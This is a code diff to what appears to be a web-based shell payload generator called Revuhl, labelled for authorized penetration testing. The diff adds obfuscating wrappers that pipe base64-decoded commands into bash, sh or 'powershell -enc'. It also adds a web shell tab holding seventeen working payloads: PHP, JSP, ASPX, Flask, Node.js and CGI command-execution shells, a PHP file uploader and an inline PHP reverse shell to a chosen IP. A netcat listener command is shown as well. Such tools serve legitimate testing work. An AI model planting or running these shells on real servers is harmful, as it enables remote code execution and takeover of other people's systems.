@@ -246,10 +246,10 @@
 <div class="container">
   <div style="display:flex; align-items:center; gap:.75rem; margin-bottom:.3rem;">
     <img src="img/Rev-nobg.png" alt="Revuhl" style="height:90px;">
-    <span class="subtitle" style="margin-bottom:0; margin-left:.5rem;">For authorized penetration testing and security assessments only.</span>
+    <span class="subtitle" style="margin-bottom:0; flex:1; text-align:center;">For authorized penetration testing and security assessments only.</span>
   </div>
 
-  <!-- Top bar: IP, Port, Encoding, Listener -->
+  <!-- Top bar: IP, Port, Encoding, Wrapper, Listener -->
   <div class="config-bar">
     <div class="input-group">
       <label for="ip">IP Address</label>
@@ -267,6 +267,17 @@
         <option value="url">URL Encode</option>
       </select>
     </div>
+    <div class="input-group">
+      <label for="wrapper">Wrapper</label>
+      <select id="wrapper" style="width:220px">
+        <option value="none">None</option>
+        <option value="bash-c">bash -c '...'</option>
+        <option value="sh-c">sh -c '...'</option>
+        <option value="b64-bash">echo ...|base64 -d|bash</option>
+        <option value="b64-sh">echo ...|base64 -d|sh</option>
+        <option value="b64-ps">powershell -enc ...</option>
+      </select>
+    </div>
     <div class="listener-pill" id="listener-pill" title="Click to copy">
       <span class="lbl">Listener</span>
       <span class="cmd" id="listener-cmd">nc -lvnp 4444</span>
@@ -277,6 +288,7 @@
   <div class="tab-bar">
     <button class="tab-btn active" data-tab="reverse">Reverse Shell</button>
     <button class="tab-btn" data-tab="bind">Bind Shell</button>
+    <button class="tab-btn" data-tab="web">Web Shell</button>
     <button class="tab-btn" data-tab="tty">TTY Upgrade</button>
   </div>
 
@@ -318,6 +330,25 @@
     </div>
   </div>
 
+  <!-- Web Shell Tab -->
+  <div class="tab-content" id="tab-web">
+    <div class="workspace">
+      <div class="shell-list">
+        <div class="shell-list-header">Web Shells</div>
+        <div class="shell-list-scroll" id="web-shell-list"></div>
+      </div>
+      <div class="output-panel">
+        <div class="output-header">
+          <span class="output-title" id="web-output-title">Select a shell &larr;</span>
+          <span class="output-tag" id="web-output-tag"></span>
+        </div>
+        <div class="output-body" id="web-output-body">
+          <div class="empty-state">Pick a web shell from the list</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <!-- TTY Upgrade Tab -->
   <div class="tab-content" id="tab-tty">
     <div class="tty-grid" id="tty-grid"></div>
@@ -333,6 +364,7 @@
   const ipEl        = document.getElementById("ip");
   const portEl      = document.getElementById("port");
   const encodingEl  = document.getElementById("encoding");
+  const wrapperEl   = document.getElementById("wrapper");
   const listenerEl  = document.getElementById("listener-cmd");
   const listenerPill = document.getElementById("listener-pill");
   const listenerLbl  = listenerPill.querySelector(".lbl");
@@ -361,6 +393,18 @@
   function encode(raw, method) {
     if (method === "base64") return btoa(unescape(encodeURIComponent(raw)));
     if (method === "url") return encodeURIComponent(raw);
+    return raw;
+  }
+
+  function wrapPayload(raw, method) {
+    if (method === "none") return raw;
+    const escaped = raw.replace(/'/g, "'\\''");
+    if (method === "bash-c") return `bash -c '${escaped}'`;
+    if (method === "sh-c") return `sh -c '${escaped}'`;
+    const b64 = btoa(unescape(encodeURIComponent(raw)));
+    if (method === "b64-bash") return `echo ${b64}|base64 -d|bash`;
+    if (method === "b64-sh") return `echo ${b64}|base64 -d|sh`;
+    if (method === "b64-ps") return `powershell -nop -enc ${b64}`;
     return raw;
   }
 
@@ -422,7 +466,8 @@
 
       const s = shells[selectedIdx];
       const raw = s.fn(ip, port);
-      const display = encode(raw, enc);
+      const wrapped = wrapPayload(raw, wrapperEl.value);
+      const display = encode(wrapped, enc);
 
       titleEl.textContent = s.name;
       tagEl.textContent = "";
@@ -516,14 +561,44 @@
     bodyEl: document.getElementById("bind-output-body"),
   });
 
+  /* ── Web Shell definitions ── */
+  const webShells = [
+    { name: "PHP system()",        fn: (ip, p) => `<?php system($_GET['cmd']); ?>` },
+    { name: "PHP exec()",          fn: (ip, p) => `<?php echo exec($_GET['cmd']); ?>` },
+    { name: "PHP passthru()",      fn: (ip, p) => `<?php passthru($_GET['cmd']); ?>` },
+    { name: "PHP shell_exec()",    fn: (ip, p) => `<?php echo shell_exec($_GET['cmd']); ?>` },
+    { name: "PHP popen()",         fn: (ip, p) => `<?php $h=popen($_GET['cmd'],'r');echo fread($h,4096);pclose($h); ?>` },
+    { name: "PHP proc_open()",     fn: (ip, p) => `<?php $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=proc_open($_GET['cmd'],$d,$pipes);echo stream_get_contents($pipes[1]);proc_close($p); ?>` },
+    { name: "PHP backtick",        fn: (ip, p) => "<?php echo `$_GET['cmd']`; ?>" },
+    { name: "PHP file upload",     fn: (ip, p) => `<?php if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo 'OK';} ?><form method=POST enctype=multipart/form-data><input type=file name=f><input type=submit></form>` },
+    { name: "PHP reverse (inline)", fn: (ip, p) => `<?php $sock=fsockopen("${ip}",${p});exec("/bin/bash -i <&3 >&3 2>&3"); ?>` },
+    { name: "JSP cmd",             fn: (ip, p) => `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` },
+    { name: "JSP Runtime exec",    fn: (ip, p) => `<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %>` },
+    { name: "ASPX cmd",            fn: (ip, p) => `<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process p=new Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+Request["cmd"]; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>` },
+    { name: "ASPX PowerShell",     fn: (ip, p) => `<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process p=new Process(); p.StartInfo.FileName="powershell.exe"; p.StartInfo.Arguments="-nop -c "+Request["cmd"]; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>` },
+    { name: "Python Flask",        fn: (ip, p) => `import os;from flask import Flask,request;app=Flask(__name__)\n@app.route('/cmd')\ndef c():return os.popen(request.args.get('cmd','')).read()\napp.run(host='0.0.0.0',port=${p})` },
+    { name: "Node.js http",        fn: (ip, p) => `require('http').createServer((q,r)=>{r.end(require('child_process').execSync(require('url').parse(q.url,true).query.cmd||'id').toString())}).listen(${p})` },
+    { name: "CGI Bash",            fn: (ip, p) => `#!/bin/bash\necho "Content-type: text/plain"\necho\neval $QUERY_STRING` },
+    { name: "CGI Perl",            fn: (ip, p) => `#!/usr/bin/perl\nuse CGI;$q=CGI->new;print $q->header;system($q->param('cmd'));` },
+  ];
+
+  const webTab = buildShellTab({
+    shells: webShells,
+    listEl: document.getElementById("web-shell-list"),
+    titleEl: document.getElementById("web-output-title"),
+    tagEl: document.getElementById("web-output-tag"),
+    bodyEl: document.getElementById("web-output-body"),
+  });
+
   /* ── Events ── */
   listenerPill.addEventListener("click", function () {
     copyText(listenerEl.textContent, this);
   });
 
-  [ipEl, portEl, encodingEl].forEach(el => el.addEventListener("input", () => {
+  [ipEl, portEl, encodingEl, wrapperEl].forEach(el => el.addEventListener("input", () => {
     reverseTab.render();
     bindTab.render();
+    webTab.render();
   }));
 
   /* ── TTY Upgrade Snippets ── */
